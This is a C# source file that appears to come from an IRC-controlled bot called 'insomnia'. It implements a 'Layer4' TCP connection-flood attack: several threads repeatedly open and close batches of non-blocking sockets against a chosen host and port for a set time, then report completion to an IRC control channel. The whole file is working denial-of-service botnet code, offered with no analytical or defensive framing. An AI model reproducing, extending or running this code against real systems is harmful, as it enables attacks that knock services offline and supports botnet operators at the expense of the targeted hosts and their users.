using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;

namespace insomnia
{
    internal class Layer4
    {
        private static ThreadStart[] j;
        private static Thread[] t;
        public static string host;
        public static int delay;
        private static IPEndPoint ipEo;
        public static int port;
        private static SendTCP[] L4Class;
        public static int sockets = 25;
        public static int threads = 5;
        public static bool isEnabled = false;

        public static void Start()
        {
            Thread l4 = new Thread(Begin);
            l4.IsBackground = true;
            l4.Start();
        }

        public static void Begin()
        {
            try
            {
                ipEo = new IPEndPoint(Dns.GetHostEntry(host).AddressList[0], port);
            }
            catch
            {
                ipEo = new IPEndPoint(IPAddress.Parse(host), port);
            }
            t = new Thread[threads];
            j = new ThreadStart[threads];
            L4Class = new SendTCP[threads];
            for (int i = 0; i < threads; i++)
            {
                L4Class[i] = new SendTCP(ipEo, sockets);
                j[i] = new ThreadStart(L4Class[i].send);
                t[i] = new Thread(j[i]);
                t[i].Start();
            }

            Thread.Sleep(delay * 1000);
            if (isEnabled)
            {
                Stop();
                IRC.WriteMessage("Layer4 flood on" + IRC.ColorCode(" " + host) + " for" + IRC.ColorCode(" " + delay) + " seconds has finished.", Config._mainChannel());
            }
        }

        public static void Stop()
        {
            isEnabled = false;
        }

        private class SendTCP
        {
            private IPEndPoint ip;
            private Socket[] s;
            private int ss;

            public SendTCP(IPEndPoint ipEo, int SynSockets)
            {
                this.ip = ipEo;
                this.ss = SynSockets;
            }

            public void OnConnect(IAsyncResult ar)
            {
            }

            public void send()
            {
                int num;
                while (isEnabled)
                {
                    try
                    {
                        this.s = new Socket[this.ss];
                        for (num = 0; num < this.ss; num++)
                        {
                            this.s[num] = new Socket(this.ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                            this.s[num].Blocking = false;
                            AsyncCallback callback = new AsyncCallback(this.OnConnect);
                            this.s[num].BeginConnect(this.ip, callback, this.s[num]);
                        }
                        Thread.Sleep(100);
                        for (num = 0; num < this.ss; num++)
                        {
                            if (this.s[num].Connected)
                            {
                                this.s[num].Disconnect(false);
                            }
                            this.s[num].Close();
                            this.s[num] = null;
                        }
                        this.s = null;
                    }
                    catch
                    {
                        for (num = 0; num < this.ss; num++)
                        {
                            try
                            {
                                if (this.s[num].Connected)
                                {
                                    this.s[num].Disconnect(false);
                                }
                                this.s[num].Close();
                                this.s[num] = null;
                            }
                            catch
                            {
                            }
                        }
                    }
                }

                for (num = 0; num < this.ss; num++)
                {
                    try
                    {
                        if (this.s[num].Connected)
                        {
                            this.s[num].Disconnect(false);
                        }
                        this.s[num].Close();
                        this.s[num] = null;
                    }
                    catch
                    {
                    }
                }
            }
        }
    }
}
